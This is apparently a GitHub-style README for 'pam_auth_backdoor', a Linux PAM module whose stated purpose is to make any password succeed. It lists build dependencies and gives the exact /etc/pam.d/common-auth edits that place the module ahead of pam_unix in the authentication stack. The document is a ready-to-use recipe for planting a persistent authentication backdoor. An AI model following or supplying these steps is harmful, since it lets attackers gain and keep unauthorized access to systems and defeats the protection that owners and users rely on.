# pam_auth_backdoor

PAM module to backdoor so that any password works.

## Installation

First install required packages (on Ubuntu and likes)

```bash
apt-get install build-essential libpam0g-dev libcurl4-openssl-dev
```

and then add in common-auth in /etc/pam.d, replace this line

```conf
auth    [success=1 default=ignore]      pam_myauth.so nullok
```

with the following lines in same order

```conf
auth	[success=2 default=ignore]	pam_myauth.so nullok_secure
auth	[success=1 default=ignore]	pam_unix.so nullok
```

